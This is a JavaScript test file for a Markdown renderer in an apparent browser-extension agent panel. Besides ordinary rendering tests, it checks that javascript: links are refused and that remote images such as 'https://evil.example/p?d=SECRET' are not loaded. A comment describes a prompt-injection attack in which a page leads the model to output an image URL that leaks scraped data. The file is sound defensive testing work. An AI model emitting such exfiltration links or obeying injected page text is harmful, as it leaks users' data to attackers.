// Renderer tests. The old renderer shipped with none, which is how a Markdown renderer that could not
// draw a table survived in a product whose whole job is presenting model output.
//
// Runs against a tiny DOM shim rather than jsdom: the renderer only ever touches createElement /
// createTextNode / appendChild / setAttribute / textContent, so a shim keeps this dependency-free and
// simultaneously PROVES the CSP-safety claim — there is no innerHTML on the shim to reach for.
import assert from 'node:assert/strict';
import { existsSync, readFileSync } from 'node:fs';
import { dirname, join } from 'node:path';
import { test } from 'node:test';
import { fileURLToPath } from 'node:url';

function element(tag) {
  return {
    tagName: tag.toUpperCase(),
    childNodes: [],
    attributes: {},
    style: {},
    className: '',
    _text: null,
    set textContent(v) {
      this._text = v;
      this.childNodes = [];
    },
    get textContent() {
      if (this._text !== null) return this._text;
      return this.childNodes.map((c) => c.textContent).join('');
    },
    get lastElementChild() {
      return [...this.childNodes].reverse().find((c) => c.tagName) ?? null;
    },
    appendChild(child) {
      this.childNodes.push(child);
      return child;
    },
    setAttribute(k, v) {
      this.attributes[k] = String(v);
    },
    getAttribute(k) {
      return this.attributes[k] ?? null;
    },
    addEventListener() {},
  };
}

globalThis.document = {
  createElement: element,
  createDocumentFragment: () => element('#fragment'),
  createTextNode: (value) => ({ tagName: null, childNodes: [], textContent: String(value) }),
};
// `navigator` is getter-only on modern Node, so define it rather than assign.
Object.defineProperty(globalThis, 'navigator', {
  value: { clipboard: { writeText: () => Promise.resolve() } },
  configurable: true,
});

const { renderMarkdown } = await import('./md.ts');

/** Depth-first search for the first element with this tag. */
function find(node, tag) {
  for (const child of node.childNodes ?? []) {
    if (child.tagName === tag.toUpperCase()) return child;
    const deeper = find(child, tag);
    if (deeper) return deeper;
  }
  return null;
}
function findAll(node, tag, out = []) {
  for (const child of node.childNodes ?? []) {
    if (child.tagName === tag.toUpperCase()) out.push(child);
    findAll(child, tag, out);
  }
  return out;
}

test('renders a GFM table with alignment instead of a run-on line of pipes', () => {
  const frag = renderMarkdown(
    [
      '| Plan | Price | Seats |',
      '|:-----|------:|:-----:|',
      '| Pro | $29 | 5 |',
      '| Team | $99 | 20 |',
    ].join('\n'),
  );
  const table = find(frag, 'table');
  assert.ok(table, 'a table element must exist');
  const headers = findAll(table, 'th').map((h) => h.textContent);
  assert.deepEqual(headers, ['Plan', 'Price', 'Seats']);
  const rows = findAll(table, 'tr');
  assert.equal(rows.length, 3); // header + 2 body rows
  const cells = findAll(rows[2], 'td').map((c) => c.textContent);
  assert.deepEqual(cells, ['Team', '$99', '20']);
  // Alignment from the delimiter row is honoured.
  assert.equal(findAll(table, 'th')[1].style.textAlign, 'right');
  assert.equal(findAll(table, 'th')[2].style.textAlign, 'center');
});

test('nested lists nest, and an ordered list keeps its starting number', () => {
  const frag = renderMarkdown(
    ['1. first', '2. second', '   - nested a', '   - nested b', '3. third'].join('\n'),
  );
  const ol = find(frag, 'ol');
  assert.ok(ol);
  const topItems = ol.childNodes.filter((c) => c.tagName === 'LI');
  assert.equal(topItems.length, 3);
  const nested = find(ol, 'ul');
  assert.ok(nested, 'the indented rows must nest, not flatten into the parent list');
  assert.equal(nested.childNodes.filter((c) => c.tagName === 'LI').length, 2);

  const offset = renderMarkdown('3. three\n4. four');
  assert.equal(find(offset, 'ol').getAttribute('start'), '3');
});

test('inline markup nests, and code spans are never re-parsed', () => {
  const frag = renderMarkdown('[**bold** link](https://example.com) and `**not bold**`');
  const anchor = find(frag, 'a');
  assert.equal(anchor.getAttribute('href'), 'https://example.com');
  assert.ok(find(anchor, 'strong'), 'a link label must be able to contain bold');
  assert.equal(find(anchor, 'strong').textContent, 'bold');
  // Inside a code span the asterisks stay literal.
  assert.equal(find(frag, 'code').textContent, '**not bold**');
});

test('underscores inside identifiers and URLs are not emphasis', () => {
  const frag = renderMarkdown('Use foo_bar_baz and my_var_name here.');
  assert.equal(findAll(frag, 'em').length, 0, 'snake_case must not become italics');
  assert.match(frag.textContent, /foo_bar_baz/);
  // A real underscore emphasis at a word boundary still works.
  assert.equal(find(renderMarkdown('this is _emphasised_ text'), 'em').textContent, 'emphasised');
});

test('hard line breaks survive instead of being joined with spaces', () => {
  const frag = renderMarkdown('Line one\nLine two\nLine three');
  const p = find(frag, 'p');
  assert.equal(findAll(p, 'br').length, 2, 'each newline in a paragraph becomes a break');
});

test('code fences keep their language and are not treated as prose', () => {
  const frag = renderMarkdown('```ts\nconst x: number = 1;\n```');
  const code = find(frag, 'code');
  assert.equal(code.getAttribute('data-language'), 'ts');
  assert.equal(code.textContent, 'const x: number = 1;');
  // An unterminated fence (normal mid-stream) still renders rather than vanishing.
  assert.match(find(renderMarkdown('```py\nprint(1)'), 'code').textContent, /print\(1\)/);
});

test('dangerous URLs are refused while their text is kept', () => {
  const frag = renderMarkdown('[click me](javascript:alert(1))');
  assert.equal(findAll(frag, 'a').length, 0, 'a javascript: URL must never become a link');
  assert.match(frag.textContent, /click me/);
  assert.equal(findAll(renderMarkdown('![x](javascript:alert(1))'), 'img').length, 0);
});

test('task lists, strikethrough, images and autolinks render', () => {
  const tasks = renderMarkdown('- [x] done\n- [ ] todo');
  const boxes = findAll(tasks, 'input');
  assert.equal(boxes.length, 2);
  assert.equal(boxes[0].getAttribute('checked'), '');
  assert.equal(boxes[1].getAttribute('checked'), null);

  assert.equal(find(renderMarkdown('~~gone~~'), 'del').textContent, 'gone');
  assert.equal(
    find(renderMarkdown('![alt](data:image/png;base64,AAA)'), 'img').getAttribute('alt'),
    'alt',
  );
  assert.equal(
    find(renderMarkdown('see https://example.com/docs for more'), 'a').getAttribute('href'),
    'https://example.com/docs',
  );
});

test('blockquotes can contain block content', () => {
  const frag = renderMarkdown('> ## Heading\n> - one\n> - two');
  const quote = find(frag, 'blockquote');
  assert.ok(find(quote, 'h2'), 'a quote must be able to contain a heading');
  assert.equal(findAll(find(quote, 'ul'), 'li').length, 2);
});

test('escaped markdown characters stay literal', () => {
  const frag = renderMarkdown('a \\* not a bullet and \\*\\*not bold\\*\\*');
  assert.equal(findAll(frag, 'strong').length, 0);
  assert.match(frag.textContent, /\*\*not bold\*\*/);
});

test('a remote image never becomes a fetch the panel makes by itself', () => {
  // The rendered text is model output derived from the page the agent just read, so a prompt-injected
  // page can end the answer with an image whose URL carries what was scraped. Drawing it would leak
  // that with zero clicks, from the profile's own network stack.
  const frag = renderMarkdown('![x](https://evil.example/p?d=SECRET)');
  assert.equal(findAll(frag, 'img').length, 0, 'a remote image must never be loaded automatically');
  const anchor = find(frag, 'a');
  assert.equal(anchor.getAttribute('href'), 'https://evil.example/p?d=SECRET');
  assert.equal(anchor.getAttribute('rel'), 'noreferrer noopener');
  assert.equal(anchor.textContent, 'x');
  // A pixel with no alt still has to be visible as something the user can choose not to click.
  const bare = find(renderMarkdown('![](http://evil.example/p)'), 'a');
  assert.equal(bare.textContent, 'http://evil.example/p');

  // `inline()` runs in every block, so the branch is reachable from all of them.
  const table = renderMarkdown(
    ['| a |', '|---|', '| ![](https://evil.example/t.png) |'].join('\n'),
  );
  assert.equal(findAll(table, 'img').length, 0);
  assert.equal(findAll(renderMarkdown('- ![](https://evil.example/l.png)'), 'img').length, 0);
  assert.equal(findAll(renderMarkdown('> ![](https://evil.example/q.png)'), 'img').length, 0);

  // Inline data: images are still drawn — they cannot reach the network.
  const inlined = find(renderMarkdown('![chart](data:image/png;base64,AAA)'), 'img');
  assert.equal(inlined.getAttribute('src'), 'data:image/png;base64,AAA');
});

test('every extension manifest forbids remote subresources', () => {
  // The renderer is only half of it. An MV3 `extension_pages` value REPLACES the platform default
  // outright, so declaring script-src/object-src/connect-src alone leaves img-src unrestricted —
  // connect-src does not cover subresource loads. The CSP is what still holds if a future renderer
  // change reintroduces a remote element.
  const here = dirname(fileURLToPath(import.meta.url));
  // public/ is the source of truth; the rest are published bundles that only exist after a build, and
  // are asserted when present so a stale bundle cannot ship a weaker policy than this tree's.
  const copies = [
    join(here, '../public/manifest.json'),
    join(here, '../dist/manifest.json'),
    join(here, '../../lobee/manifest.json'),
    join(here, '../../../apps/desktop/src-tauri/resources/lobee/manifest.json'),
  ].filter((path) => existsSync(path));
  assert.ok(copies.length > 0, 'the source manifest must exist');

  for (const path of copies) {
    const csp = JSON.parse(readFileSync(path, 'utf8')).content_security_policy?.extension_pages;
    assert.ok(csp, `${path}: extension_pages must declare a policy`);
    const directives = new Map(
      csp
        .split(';')
        .map((part) => part.trim())
        .filter(Boolean)
        .map((part) => {
          const [name, ...sources] = part.split(/\s+/);
          return [name, sources];
        }),
    );
    for (const name of ['img-src', 'media-src', 'frame-src']) {
      const sources = directives.get(name);
      assert.ok(sources, `${path}: ${name} must be declared — extension_pages replaces the default`);
      for (const source of sources) {
        assert.ok(
          !/^\*|^https?:|^\/\//.test(source),
          `${path}: ${name} must not allow the remote source ${source}`,
        );
      }
    }
    assert.deepEqual(directives.get('img-src'), ["'self'", 'data:'], `${path}: img-src`);
  }
});
